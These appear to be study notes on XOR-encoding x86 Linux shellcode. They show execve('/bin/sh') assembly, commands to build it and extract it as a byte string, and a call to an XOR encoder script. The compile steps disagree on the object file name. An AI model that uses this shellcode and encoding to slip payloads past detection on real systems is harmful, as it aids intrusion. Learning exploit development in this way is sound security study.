# XOR Encoder

## Basic XOR Encoding/Decoding
```ASM
(A XOR B) XOR B = A
```

## XOR Encoding Process
#### 1) Create execve_04_sh_stack.nasm file
```ASM
global _start

section .text

_start:

	xor eax, eax			; Preparing Nulls in EAX register
	push eax			; Pushing the first Null DWORD
	
	push 0x68732f6e			; //bin/sh in reverse order
	push 0x69622f2f
	
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	
	; syscall()
	mov al, 0xb
	int 0x80
```
#### 2) Compile it
```bash
$ nasm -f elf32 -o execve_04_sh_stack execve_04_sh_stack.nasm
$ ld -o execve_04_sh_stack execve_04_sh_stack.o
```
#### 3) Extract shellcode from the binary
```bash
# This will only outputs the shellcode with copy and paste friendly format
# https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump

objdump -d ./PROGRAM | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d ' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
```
#### 4) XOR the extracted shellcode
```bash
https://github.com/bigb0sss/XOREncoder

./XOREncoder.py -s "<Shellcode>" -k "<Key>"
```

